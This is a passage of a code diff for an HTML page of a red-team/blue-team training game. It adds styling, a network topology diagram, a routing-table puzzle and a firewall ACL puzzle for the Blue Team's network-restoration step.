@@ -4,171 +4,137 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Phase 3 — Final Response | CUTLINE</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Barlow+Condensed:wght@300;400;600;700;900&family=Barlow:wght@300;400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../css/global.css">
   <style>
-    /* ── Split layout ── */
-    .race-container {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 1.5rem;
-      margin-top: 1rem;
-    }
-    @media (max-width: 700px) { .race-container { grid-template-columns: 1fr; } }
+    /* ── Race layout ── */
+    .race-container { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; margin-top: 1rem; }
+    @media (max-width: 780px) { .race-container { grid-template-columns: 1fr; } }
 
-    .race-lane {
-      border: 1px solid;
-      padding: 1.25rem;
-      opacity: 0.4;
-      pointer-events: none;
-      transition: opacity 0.3s;
-      position: relative;
-    }
-    .race-lane.blue { border-color: rgba(74,158,255,0.3); background: rgba(74,158,255,0.02); }
-    .race-lane.red  { border-color: rgba(255,74,74,0.3);  background: rgba(255,74,74,0.02); }
+    .race-lane { border: 1px solid; padding: 1.25rem; opacity: 0.35; pointer-events: none; transition: opacity 0.3s; position: relative; }
+    .race-lane.blue { border-color: rgba(74,158,255,0.25); background: rgba(74,158,255,0.02); }
+    .race-lane.red  { border-color: rgba(255,74,74,0.25);  background: rgba(255,74,74,0.02); }
     .race-lane.active { opacity: 1; pointer-events: all; }
-    .race-lane.won  { border-color: var(--green); background: rgba(61,220,132,0.05); }
-    .race-lane.lost { opacity: 0.35; }
+    .race-lane.won  { border-color: var(--green); background: rgba(61,220,132,0.04); opacity: 1; }
+    .race-lane.lost { opacity: 0.25; pointer-events: none; }
 
-    .lane-header {
-      display: flex; align-items: center; justify-content: space-between;
-      margin-bottom: 1.25rem; padding-bottom: 0.75rem;
-      border-bottom: 1px solid rgba(255,255,255,0.06);
-    }
-    .lane-title { font-family: 'Barlow Condensed', sans-serif; font-weight: 700; font-size: 1.1rem; letter-spacing: 0.08em; text-transform: uppercase; }
+    .lane-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 1rem; padding-bottom: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); }
+    .lane-title { font-family: 'Barlow Condensed', sans-serif; font-weight: 700; font-size: 1rem; letter-spacing: 0.08em; text-transform: uppercase; }
     .lane-title.blue { color: var(--blue); }
-    .lane-title.red  { color: var(--red); }
-    .lane-progress { font-family: 'Share Tech Mono', monospace; font-size: 0.65rem; color: var(--muted); letter-spacing: 0.1em; }
+    .lane-title.red  { color: var(--red);  }
+    .lane-progress { font-family: 'Share Tech Mono', monospace; font-size: 0.6rem; color: var(--muted); }
 
     .sub-step { display: none; }
-    .sub-step.active { display: block; animation: slideIn 0.35s ease; }
+    .sub-step.active { display: block; animation: slideIn 0.3s ease; }
 
     /* ── Timer ── */
-    .race-timer {
-      text-align: center; padding: 0.75rem;
-      background: rgba(0,0,0,0.3);
-      border: 1px solid rgba(255,255,255,0.08);
-      font-family: 'Share Tech Mono', monospace;
-      font-size: 1.8rem; letter-spacing: 0.1em;
-      color: var(--yellow); margin-bottom: 1.5rem;
-    }
-    .race-timer .timer-label { font-size: 0.6rem; color: var(--muted); display: block; margin-bottom: 0.25rem; }
+    .race-timer { text-align: center; padding: 0.6rem; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.07); font-family: 'Share Tech Mono', monospace; font-size: 1.6rem; letter-spacing: 0.1em; color: var(--yellow); margin-bottom: 1.25rem; }
+    .race-timer .timer-label { font-size: 0.55rem; color: var(--muted); display: block; margin-bottom: 0.15rem; }
 
-    /* ── Network diagram (Blue team) ── */
-    .network-editor {
-      background: #060810; border: 1px solid rgba(74,158,255,0.1);
-      padding: 1rem; margin-bottom: 1rem;
-    }
-    .ip-field {
-      display: inline-block; background: rgba(74,158,255,0.1);
-      border: 1px dashed rgba(74,158,255,0.4); color: var(--accent);
-      font-family: 'Share Tech Mono', monospace; font-size: 0.75rem;
-      padding: 0.15rem 0.4rem; min-width: 100px; outline: none;
-      letter-spacing: 0.05em;
-    }
-    .ip-field:focus { background: rgba(74,158,255,0.15); border-color: var(--accent); }
-    .ip-field.correct { background: rgba(61,220,132,0.1); border-color: var(--green); color: var(--green); }
-    .ip-field.wrong   { background: rgba(255,74,74,0.1);  border-color: var(--red);   color: var(--red); animation: shake 0.3s; }
-    @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-4px)} 75%{transform:translateX(4px)} }
+    /* ══════════════════════════════
+       BLUE TEAM — Network topology
+       ══════════════════════════════ */
+    .net-diagram { background: #030810; border: 1px solid rgba(74,158,255,0.1); padding: 0.75rem; margin-bottom: 0.75rem; overflow-x: auto; }
+    .net-svg { width: 100%; min-width: 500px; height: auto; }
+    .net-node { cursor: default; }
+    .net-node-box { fill: #060f1a; stroke-width: 1.5; rx: 3; }
+    .net-node-box.router  { stroke: #4a9eff; }
+    .net-node-box.server  { stroke: #3ddc84; }
+    .net-node-box.broken  { stroke: #ff4a4a; animation: blink-border 1s infinite; }
+    .net-node-box.firewall{ stroke: #f5c542; }
+    .net-label { font-family: 'Share Tech Mono', monospace; font-size: 9px; fill: #c8d8e8; text-anchor: middle; }
+    .net-sublabel { font-family: 'Share Tech Mono', monospace; font-size: 7px; fill: rgba(200,216,232,0.5); text-anchor: middle; }
+    .net-link { stroke-width: 1.5; fill: none; }
+    .net-link.ok  { stroke: rgba(74,158,255,0.3); }
+    .net-link.err { stroke: rgba(255,74,74,0.7); stroke-dasharray: 5,4; animation: dashAnim 1s linear infinite; }
+    .net-link.warn{ stroke: rgba(245,197,66,0.5); stroke-dasharray: 3,3; }
+    @keyframes blink-border { 0%,100%{opacity:1} 50%{opacity:0.3} }
+    @keyframes dashAnim { to { stroke-dashoffset: -20; } }
 
-    .node-box {
-      display: inline-flex; align-items: center; justify-content: center;
-      padding: 0.4rem 0.75rem; border: 1px solid;
-      font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
-      letter-spacing: 0.08em; text-transform: uppercase; min-width: 90px;
-    }
-    .node-box.router { border-color: var(--accent); color: var(--accent); background: rgba(74,158,255,0.06); }
-    .node-box.server { border-color: var(--green);  color: var(--green);  background: rgba(61,220,132,0.06); }
-    .node-box.broken { border-color: var(--red);    color: var(--red);    background: rgba(255,74,74,0.06); }
-    .connector { font-family: 'Share Tech Mono', monospace; color: var(--muted); font-size: 0.75rem; padding: 0 0.3rem; }
+    .ip-field { display: inline-block; background: rgba(74,158,255,0.08); border: 1px dashed rgba(74,158,255,0.4); color: var(--accent); font-family: 'Share Tech Mono', monospace; font-size: 0.72rem; padding: 0.12rem 0.35rem; min-width: 110px; outline: none; letter-spacing: 0.04em; }
+    .ip-field:focus { background: rgba(74,158,255,0.14); border-color: var(--accent); }
+    .ip-field.correct { background: rgba(61,220,132,0.1); border-color: var(--green); color: var(--green); border-style: solid; }
+    .ip-field.wrong   { background: rgba(255,74,74,0.1);  border-color: var(--red);   color: var(--red);   animation: shake 0.3s; }
+    @keyframes shake { 0%,100%{transform:translateX(0)} 25%{transform:translateX(-3px)} 75%{transform:translateX(3px)} }
 
-    /* ── Simon game ── */
-    .simon-grid {
-      display: grid; grid-template-columns: 1fr 1fr;
-      gap: 0.5rem; margin: 1rem 0;
-    }
-    .simon-btn {
-      height: 70px; border: 2px solid; cursor: pointer;
-      transition: all 0.15s; border-radius: 4px;
-      font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; letter-spacing: 0.1em;
-      display: flex; align-items: center; justify-content: center;
-      user-select: none;
-    }
-    .simon-btn[data-color="blue"]   { border-color: #4a9eff; color: #4a9eff; background: rgba(74,158,255,0.08); }
-    .simon-btn[data-color="green"]  { border-color: #3ddc84; color: #3ddc84; background: rgba(61,220,132,0.08); }
-    .simon-btn[data-color="yellow"] { border-color: #f5c542; color: #f5c542; background: rgba(245,197,66,0.08); }
-    .simon-btn[data-color="red"]    { border-color: #ff4a4a; color: #ff4a4a; background: rgba(255,74,74,0.08); }
-    .simon-btn.lit[data-color="blue"]   { background: rgba(74,158,255,0.6); color: #fff; }
-    .simon-btn.lit[data-color="green"]  { background: rgba(61,220,132,0.6); color: #fff; }
-    .simon-btn.lit[data-color="yellow"] { background: rgba(245,197,66,0.6); color: #000; }
-    .simon-btn.lit[data-color="red"]    { background: rgba(255,74,74,0.6); color: #fff; }
-    .simon-btn:disabled { cursor: not-allowed; opacity: 0.5; }
+    /* Routing table */
+    .rt-table { width: 100%; border-collapse: collapse; margin-bottom: 0.75rem; }
+    .rt-table th { font-family: 'Share Tech Mono', monospace; font-size: 0.56rem; letter-spacing: 0.1em; color: var(--muted); text-align: left; padding: 0.3rem 0.5rem; border-bottom: 1px solid rgba(74,158,255,0.15); }
+    .rt-table td { font-family: 'Share Tech Mono', monospace; font-size: 0.65rem; padding: 0.3rem 0.5rem; border-bottom: 1px solid rgba(74,158,255,0.05); }
+    .rt-editable { cursor: pointer; color: var(--red); border-bottom: 1px dashed var(--red); }
+    .rt-editable:hover { color: var(--yellow); }
+    .rt-fixed { color: var(--green); }
 
-    /* ── Maze (Red team) ── */
-    .maze-container { background: #060810; border: 1px solid rgba(255,74,74,0.1); padding: 0.5rem; margin-bottom: 1rem; display: flex; justify-content: center; }
-    canvas#mazeCanvas { display: block; image-rendering: pixelated; }
+    /* ══════════════════════════════
+       BLUE TEAM — Simon (harder)
+       ══════════════════════════════ */
+    .simon-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.4rem; margin: 0.75rem 0; }
+    .simon-btn { height: 60px; border: 2px solid; cursor: pointer; transition: all 0.12s; border-radius: 3px; font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; letter-spacing: 0.1em; display: flex; align-items: center; justify-content: center; user-select: none; }
+    .simon-btn[data-color="blue"]   { border-color: #4a9eff; color: #4a9eff; background: rgba(74,158,255,0.06); }
+    .simon-btn[data-color="green"]  { border-color: #3ddc84; color: #3ddc84; background: rgba(61,220,132,0.06); }
+    .simon-btn[data-color="yellow"] { border-color: #f5c542; color: #f5c542; background: rgba(245,197,66,0.06); }
+    .simon-btn[data-color="red"]    { border-color: #ff4a4a; color: #ff4a4a; background: rgba(255,74,74,0.06); }
+    .simon-btn[data-color="white"]  { border-color: #e0e0e0; color: #e0e0e0; background: rgba(224,224,224,0.06); }
+    .simon-btn[data-color="cyan"]   { border-color: #00e5ff; color: #00e5ff; background: rgba(0,229,255,0.06); }
+    .simon-btn.lit[data-color="blue"]   { background: rgba(74,158,255,0.7); color: #fff; }
+    .simon-btn.lit[data-color="green"]  { background: rgba(61,220,132,0.7); color: #fff; }
+    .simon-btn.lit[data-color="yellow"] { background: rgba(245,197,66,0.7); color: #000; }
+    .simon-btn.lit[data-color="red"]    { background: rgba(255,74,74,0.7);  color: #fff; }
+    .simon-btn.lit[data-color="white"]  { background: rgba(224,224,224,0.8);color: #000; }
+    .simon-btn.lit[data-color="cyan"]   { background: rgba(0,229,255,0.7);  color: #000; }
+    .simon-btn:disabled { cursor: not-allowed; opacity: 0.45; }
 
-    /* ── Code fix (Red team) ── */
-    .code-editor {
-      background: #030609; border: 1px solid rgba(255,74,74,0.15);
-      padding: 0.75rem; font-family: 'Share Tech Mono', monospace;
-      font-size: 0.72rem; line-height: 1.8; overflow-x: auto;
-    }
+    /* ══════════════════════════════
+       RED TEAM — Maze
+       ══════════════════════════════ */
+    .maze-wrap { display: flex; justify-content: center; margin-bottom: 0.75rem; position: relative; }
+    canvas#mazeCanvas { display: block; image-rendering: pixelated; border: 1px solid rgba(255,74,74,0.15); }
+    .maze-legend { font-family: 'Share Tech Mono', monospace; font-size: 0.58rem; color: var(--muted); display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 0.5rem; }
+    .maze-legend span { display: flex; align-items: center; gap: 0.3rem; }
+    .maze-legend .swatch { width: 12px; height: 12px; display: inline-block; border: 1px solid rgba(255,255,255,0.2); }
+    .maze-controls { display: flex; gap: 0.4rem; justify-content: center; flex-wrap: wrap; margin-bottom: 0.75rem; }
+    .maze-controls button { width: 44px; height: 44px; background: rgba(255,74,74,0.08); border: 1px solid rgba(255,74,74,0.3); color: var(--red); font-size: 1rem; cursor: pointer; transition: all 0.15s; border-radius: 3px; }
+    .maze-controls button:hover { background: rgba(255,74,74,0.18); }
+    .maze-phase-label { font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; color: var(--muted); text-align: center; margin-bottom: 0.4rem; }
+
+    /* ══════════════════════════════
+       RED TEAM — Code fix
+       ══════════════════════════════ */
+    .code-editor { background: #020608; border: 1px solid rgba(255,74,74,0.12); padding: 0.75rem; font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; line-height: 1.9; overflow-x: auto; }
     .code-line { display: flex; gap: 0.75rem; }
-    .code-ln   { color: var(--muted); min-width: 1.5rem; text-align: right; user-select: none; }
+    .code-ln   { color: var(--muted); min-width: 1.5rem; text-align: right; user-select: none; font-size: 0.6rem; }
     .code-txt  { color: var(--text); }
-    .code-txt .kw { color: #ff79c6; }
-    .code-txt .str { color: #f1fa8c; }
-    .code-txt .fn { color: #50fa7b; }
-    .code-txt .cm { color: #6272a4; }
-    .code-txt .err { color: var(--red); background: rgba(255,74,74,0.15); text-decoration: underline; text-decoration-color: var(--red); cursor: pointer; }
-    .code-txt .fix { color: var(--green); background: rgba(61,220,132,0.1); }
+    .kw  { color: #ff79c6; }
+    .str { color: #f1fa8c; }
+    .fn  { color: #50fa7b; }
+    .cm  { color: #5a6a8a; font-style: italic; }
+    .err { color: var(--red); background: rgba(255,74,74,0.12); text-decoration: underline wavy var(--red); cursor: pointer; }
+    .err:hover { background: rgba(255,74,74,0.2); }
+    .fix { color: var(--green); background: rgba(61,220,132,0.08); }
 
-    /* ── Outcome screen ── */
-    .outcome-overlay {
-      display: none; position: fixed; inset: 0;
-      background: rgba(5,8,12,0.97); z-index: 200;
-      flex-direction: column; align-items: center; justify-content: center;
-      text-align: center; padding: 2rem;
-    }
+    /* Enemy notes */
+    .enemy-note { background: #09040a; border: 1px solid rgba(180,80,180,0.3); padding: 0.6rem 0.875rem; margin: 0.75rem 0; font-family: 'Share Tech Mono', monospace; font-size: 0.62rem; color: rgba(200,140,200,0.6); line-height: 1.8; position: relative; }
+    .enemy-note::before { content: '⚠ ПЕРЕХВАЧЕНО / INTERCEPTED'; display: block; font-size: 0.5rem; letter-spacing: 0.15em; color: rgba(180,80,180,0.7); margin-bottom: 0.4rem; }
+
+    /* ── Outcome ── */
+    .outcome-overlay { display: none; position: fixed; inset: 0; background: rgba(5,8,12,0.97); z-index: 200; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 2rem; }
     .outcome-overlay.show { display: flex; animation: fadeIn 0.8s ease; }
-    .outcome-title {
-      font-family: 'Barlow Condensed', sans-serif; font-weight: 900;
-      font-size: clamp(2.5rem,6vw,5rem); letter-spacing: 0.05em; text-transform: uppercase;
-      line-height: 1; margin-bottom: 1rem;
-    }
-    .outcome-sub {
-      font-size: 0.9rem; color: var(--muted); max-width: 500px; line-height: 1.7;
-    }
-    .outcome-stats {
-      display: flex; gap: 2rem; margin: 1.5rem 0;
-    }
-    .outcome-stat { text-align: center; }
+    .outcome-title { font-family: 'Barlow Condensed', sans-serif; font-weight: 900; font-size: clamp(2.5rem,6vw,5rem); letter-spacing: 0.05em; text-transform: uppercase; line-height: 1; margin-bottom: 1rem; }
+    .outcome-sub { font-size: 0.88rem; color: var(--muted); max-width: 520px; line-height: 1.7; }
+    .outcome-stats { display: flex; gap: 2.5rem; margin: 1.5rem 0; }
     .outcome-stat .val { font-family: 'Share Tech Mono', monospace; font-size: 1.4rem; }
-    .outcome-stat .lbl { font-size: 0.65rem; color: var(--muted); letter-spacing: 0.15em; text-transform: uppercase; font-family: 'Share Tech Mono', monospace; }
-
-    .confetti-dot {
-      position: fixed; border-radius: 50%;
-      animation: confettiFall linear forwards;
-      pointer-events: none;
-    }
-    @keyframes confettiFall {
-      0%   { transform: translateY(-20px) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
-    }
+    .outcome-stat .lbl { font-size: 0.6rem; color: var(--muted); letter-spacing: 0.15em; text-transform: uppercase; font-family: 'Share Tech Mono', monospace; }
   </style>
 </head>
 <body>
 <div class="page-layout">
   <div class="top-bar" id="topBar"></div>
 
-  <div class="phase-content" style="max-width:1100px">
-
+  <div class="phase-content" style="max-width:1120px">
     <div class="phase-header">
       <div class="phase-number">PHASE 03 — PARALLEL RACE</div>
       <div class="phase-title">Final Response</div>
-      <div class="phase-desc">Both teams act simultaneously. <strong class="blue">Blue Team</strong> must restore the network before the threat spreads. <strong class="red">Red Team</strong> must complete their cleanup operation before Blue Team finishes. First to complete shapes the outcome.</div>
+      <div class="phase-desc">Both teams act simultaneously. <strong style="color:var(--blue)">Blue Team</strong> must restore the damaged network infrastructure before the intrusion propagates. <strong style="color:var(--red)">Red Team</strong> must complete their exfiltration and cover their tracks. First to finish shapes the outcome for the UN debrief.</div>
     </div>
 
     <div class="race-timer">
@@ -178,488 +144,763 @@
 
     <div class="race-container">
 
-      <!-- ═══════════ BLUE TEAM LANE ═══════════ -->
+      <!-- ════════════ BLUE TEAM LANE ════════════ -->
       <div class="race-lane blue" id="blueLane">
         <div class="lane-header">
-          <span class="lane-title blue">◈ BLUE TEAM — Network Restoration</span>
+          <span class="lane-title blue">◈ BLUE — Network Restoration</span>
           <span class="lane-progress" id="blueProgress">STEP 1/2</span>
         </div>
 
-        <!-- Blue Step 1: IP routing ── -->
+        <!-- Blue Step 1: Routing fix + Firewall ACL -->
         <div class="sub-step active" id="blue-s1">
-          <div class="enigma-q" style="margin-bottom:1rem">
-            <strong>Task 1:</strong> The routing table was corrupted during the fault. Restore the correct IP addresses for the damaged segment. Fill in the missing values to rebuild the routes.
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.75rem">
+            SYSLOG ALERT · 2024-01-12 04:17:32Z — Network partition detected. 3 routing anomalies. BGP session dropped. Firewall ACL misconfigured. Restore full connectivity.
           </div>
 
-          <div class="network-editor">
-            <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.75rem;letter-spacing:0.1em">// ROUTING TABLE RECONSTRUCTION — SEG-ATL-48</div>
+          <!-- Network topology SVG -->
+          <div class="net-diagram">
+            <svg class="net-svg" viewBox="0 0 560 340" xmlns="http://www.w3.org/2000/svg">
+              <!-- Links -->
+              <!-- CORE → FW1 (ok) -->
+              <line x1="280" y1="50" x2="140" y2="120" class="net-link ok"/>
+              <!-- CORE → FW2 (ok) -->
+              <line x1="280" y1="50" x2="420" y2="120" class="net-link ok"/>
+              <!-- FW1 → R-WEST (ok) -->
+              <line x1="140" y1="120" x2="80" y2="210" class="net-link ok"/>
+              <!-- FW1 → R-DMZW (error) -->
+              <line x1="140" y1="120" x2="200" y2="210" class="net-link err"/>
+              <!-- FW2 → R-DMZE (error) -->
+              <line x1="420" y1="120" x2="360" y2="210" class="net-link err"/>
+              <!-- FW2 → R-EAST (warn) -->
+              <line x1="420" y1="120" x2="480" y2="210" class="net-link warn"/>
+              <!-- R-WEST → SRV-WEST (ok) -->
+              <line x1="80" y1="210" x2="60" y2="295" class="net-link ok"/>
+              <!-- R-DMZW → SRV-CABLE (error) -->
+              <line x1="200" y1="210" x2="180" y2="295" class="net-link err"/>
+              <!-- R-DMZE → SRV-CABLE2 (error) -->
+              <line x1="360" y1="210" x2="340" y2="295" class="net-link err"/>
+              <!-- R-EAST → SRV-EAST (ok) -->
+              <line x1="480" y1="210" x2="500" y2="295" class="net-link ok"/>
+              <!-- CORE → NMS (ok) -->
+              <line x1="280" y1="50" x2="280" y2="130" class="net-link ok"/>
 
-            <div style="display:flex;flex-direction:column;gap:0.6rem">
-              <div style="display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap">
-                <div class="node-box router">CORE-R1</div>
-                <span class="connector">──</span>
-                <span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted)">eth2:</span>
-                <input class="ip-field" id="ip1" placeholder="___.__.___.___" maxlength="15" spellcheck="false" autocomplete="off">
-                <span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted)">/30</span>
-              </div>
-              <div style="display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap;padding-left:1.5rem">
-                <span class="connector" style="font-size:1rem">↕</span>
-                <span style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted)">GW:</span>
-                <input class="ip-field" id="ip2" placeholder="___.__.___.___" maxlength="15" spellcheck="false" autocomplete="off">
-              </div>
-              <div style="display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap">
-                <div class="node-box broken">EDGE-SW-48</div>
-                <span class="connector">──</span>
-                <span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted)">subnet:</span>
-                <input class="ip-field" id="ip3" placeholder="___.__.___.___" maxlength="18" spellcheck="false" autocomplete="off">
-              </div>
-              <div style="display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap">
-                <div class="node-box server">TERM-SEA-48</div>
-                <span class="connector">──</span>
-                <span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted)">host:</span>
-                <input class="ip-field" id="ip4" placeholder="___.__.___.___" maxlength="15" spellcheck="false" autocomplete="off">
-              </div>
-            </div>
+              <!-- Nodes -->
+              <!-- CORE-RTR -->
+              <rect x="230" y="25" width="100" height="34" rx="3" class="net-node-box router" fill="#060f1a" stroke="#4a9eff" stroke-width="1.5"/>
+              <text x="280" y="40" class="net-label">CORE-RTR-01</text>
+              <text x="280" y="51" class="net-sublabel">10.0.0.1/16</text>
 
-            <div style="margin-top:0.75rem;font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted)">
-              // Reference: Subnet space 192.168.48.0/21 | Router is .1 | Switch is .2 | Host is .5 | GW is router eth2 address
-            </div>
+              <!-- NMS -->
+              <rect x="242" y="126" width="76" height="28" rx="3" class="net-node-box server" fill="#060f1a" stroke="#3ddc84" stroke-width="1.5"/>
+              <text x="280" y="139" class="net-label">NMS-01</text>
+              <text x="280" y="149" class="net-sublabel">10.0.1.2/24</text>
+
+              <!-- FW1 -->
+              <rect x="90" y="102" width="100" height="34" rx="3" fill="#060f1a" stroke="#f5c542" stroke-width="1.5"/>
+              <text x="140" y="117" class="net-label">FW-WEST-01</text>
+              <text x="140" y="128" class="net-sublabel">10.0.2.1/24</text>
+
+              <!-- FW2 -->
+              <rect x="370" y="102" width="100" height="34" rx="3" fill="#060f1a" stroke="#f5c542" stroke-width="1.5"/>
+              <text x="420" y="117" class="net-label">FW-EAST-01</text>
+              <text x="420" y="128" class="net-sublabel">10.0.3.1/24</text>
+
+              <!-- R-WEST -->
+              <rect x="30" y="193" width="100" height="34" rx="3" fill="#060f1a" stroke="#4a9eff" stroke-width="1.5"/>
+              <text x="80" y="208" class="net-label">RTR-WEST-02</text>
+              <text x="80" y="219" class="net-sublabel">10.1.0.1/24</text>
+
+              <!-- R-DMZW (broken) -->
+              <rect x="150" y="193" width="100" height="34" rx="3" fill="#060f1a" stroke="#ff4a4a" stroke-width="1.5" style="animation:blink-border 1s infinite"/>
+              <text x="200" y="208" class="net-label" fill="#ff4a4a">RTR-DMZ-W</text>
+              <text x="200" y="219" class="net-sublabel" fill="rgba(255,74,74,0.6)">⚠ MISCONFIGURED</text>
+
+              <!-- R-DMZE (broken) -->
+              <rect x="310" y="193" width="100" height="34" rx="3" fill="#060f1a" stroke="#ff4a4a" stroke-width="1.5"/>
+              <text x="360" y="208" class="net-label" fill="#ff4a4a">RTR-DMZ-E</text>
+              <text x="360" y="219" class="net-sublabel" fill="rgba(255,74,74,0.6)">⚠ BLACKHOLE</text>
+
+              <!-- R-EAST -->
+              <rect x="430" y="193" width="100" height="34" rx="3" fill="#060f1a" stroke="#f5c542" stroke-width="1.5"/>
+              <text x="480" y="208" class="net-label">RTR-EAST-02</text>
+              <text x="480" y="219" class="net-sublabel">10.3.0.1/24</text>
+
+              <!-- SRV-WEST -->
+              <rect x="20" y="278" width="80" height="28" rx="3" fill="#060f1a" stroke="#3ddc84" stroke-width="1.5"/>
+              <text x="60" y="291" class="net-label">SRV-WEST</text>
+              <text x="60" y="301" class="net-sublabel">10.1.1.10</text>
+
+              <!-- SRV-CABLE (broken) -->
+              <rect x="140" y="278" width="80" height="28" rx="3" fill="#060f1a" stroke="#ff4a4a" stroke-width="1.5"/>
+              <text x="180" y="291" class="net-label" fill="#ff4a4a">SRV-CABLE1</text>
+              <text x="180" y="301" class="net-sublabel" fill="rgba(255,74,74,0.6)">UNREACHABLE</text>
+
+              <!-- SRV-CABLE2 (broken) -->
+              <rect x="300" y="278" width="80" height="28" rx="3" fill="#060f1a" stroke="#ff4a4a" stroke-width="1.5"/>
+              <text x="340" y="291" class="net-label" fill="#ff4a4a">SRV-CABLE2</text>
+              <text x="340" y="301" class="net-sublabel" fill="rgba(255,74,74,0.6)">UNREACHABLE</text>
+
+              <!-- SRV-EAST -->
+              <rect x="460" y="278" width="80" height="28" rx="3" fill="#060f1a" stroke="#3ddc84" stroke-width="1.5"/>
+              <text x="500" y="291" class="net-label">SRV-EAST</text>
+              <text x="500" y="301" class="net-sublabel">10.3.1.10</text>
+            </svg>
           </div>
 
-          <button class="btn btn-primary" onclick="checkBlueIPs()" style="width:100%">VERIFY ROUTING TABLE</button>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.5rem">ROUTING TABLE — Fix the highlighted incorrect values (click to edit):</div>
+          <table class="rt-table">
+            <thead><tr><th>DESTINATION</th><th>NEXT-HOP</th><th>INTERFACE</th><th>METRIC</th><th>STATUS</th></tr></thead>
+            <tbody>
+              <tr>
+                <td>10.0.0.0/16</td>
+                <td class="rt-fixed">10.0.0.1</td>
+                <td class="rt-fixed">GigE0/0</td>
+                <td class="rt-fixed">1</td>
+                <td style="color:var(--green)">ACTIVE</td>
+              </tr>
+              <tr>
+                <td>10.2.0.0/24 (DMZ-W)</td>
+                <td><span class="rt-editable" id="rt1" onclick="fixRoute('rt1','10.0.2.254','10.2.0.0/24')">10.0.2.1</span></td>
+                <td class="rt-fixed">GigE0/1</td>
+                <td class="rt-fixed">10</td>
+                <td style="color:var(--red)">LOOP ⚠</td>
+              </tr>
+              <tr>
+                <td>10.2.1.0/24 (SRV-CABLE1)</td>
+                <td><span class="rt-editable" id="rt2" onclick="fixRoute('rt2','10.2.1.1','10.2.1.0/24')">Null0</span></td>
+                <td class="rt-fixed">GigE0/1</td>
+                <td class="rt-fixed">20</td>
+                <td style="color:var(--red)">BLACKHOLE ⚠</td>
+              </tr>
+              <tr>
+                <td>10.3.0.0/24 (DMZ-E)</td>
+                <td><span class="rt-editable" id="rt3" onclick="fixRoute('rt3','10.0.3.254','10.3.0.0/24')">10.0.0.254</span></td>
+                <td class="rt-fixed">GigE0/2</td>
+                <td class="rt-fixed">10</td>
+                <td style="color:var(--yellow)">STALE ⚠</td>
+              </tr>
+              <tr>
+                <td>10.3.1.0/24 (SRV-CABLE2)</td>
+                <td><span class="rt-editable" id="rt4" onclick="fixRoute('rt4','10.3.1.1','10.3.1.0/24')">MISSING</span></td>
+                <td class="rt-fixed">GigE0/2</td>
+                <td class="rt-fixed">20</td>
+                <td style="color:var(--red)">MISSING ⚠</td>
+              </tr>
+              <tr>
+                <td>0.0.0.0/0</td>
+                <td class="rt-fixed">10.0.0.254</td>
+                <td class="rt-fixed">GigE0/3</td>
+                <td class="rt-fixed">200</td>
+                <td style="color:var(--green)">ACTIVE</td>
+              </tr>
+            </tbody>
+          </table>
+
+          <!-- Firewall ACL fix -->
+          <div style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:var(--muted);margin-bottom:0.5rem;margin-top:0.75rem">FIREWALL ACL — Two rules are sabotaged. Fix the highlighted values:</div>
+          <div class="code-editor" style="font-size:0.64rem">
+            <div class="code-line"><span class="code-ln">01</span><span class="code-txt"><span class="cm">! FW-WEST-01 :: ACL inbound DMZ</span></span></div>
+            <div class="code-line"><span class="code-ln">02</span><span class="code-txt"><span class="kw">access-list</span> 110 <span class="kw">permit</span> tcp 10.2.0.0 0.0.0.255 10.2.1.0 0.0.0.255 <span class="kw">eq</span> 443</span></div>
+            <div class="code-line"><span class="code-ln">03</span><span class="code-txt"><span class="kw">access-list</span> 110 <span class="kw">permit</span> tcp 10.2.0.0 0.0.0.255 10.2.1.0 0.0.0.255 <span class="kw">eq</span> 22</span></div>
+            <div class="code-line"><span class="code-ln">04</span><span class="code-txt"><span class="kw">access-list</span> 110 <span class="fn">deny</span> <span class="err" id="acl1" onclick="fixACL('acl1','any','udp')">udp</span> any 10.2.0.0 0.0.0.255  <span class="cm">! should be: deny ip any ...</span></span></div>
+            <div class="code-line"><span class="code-ln">05</span><span class="code-txt"><span class="kw">access-list</span> 110 <span class="fn">permit</span> ip <span class="err" id="acl2" onclick="fixACL('acl2','10.0.0.0 0.255.255.255','subnet')">192.168.0.0 0.0.255.255</span> any  <span class="cm">! should be 10.x.x.x internal</span></span></div>
+            <div class="code-line"><span class="code-ln">06</span><span class="code-txt"><span class="kw">access-list</span> 110 <span class="fn">deny</span> ip any any <span class="cm">! implicit deny</span></span></div>
+          </div>
+
+          <div class="flex gap1 mt2">
+            <button class="btn btn-primary" onclick="checkBlueS1()">VERIFY ROUTING + FIREWALL</button>
+          </div>
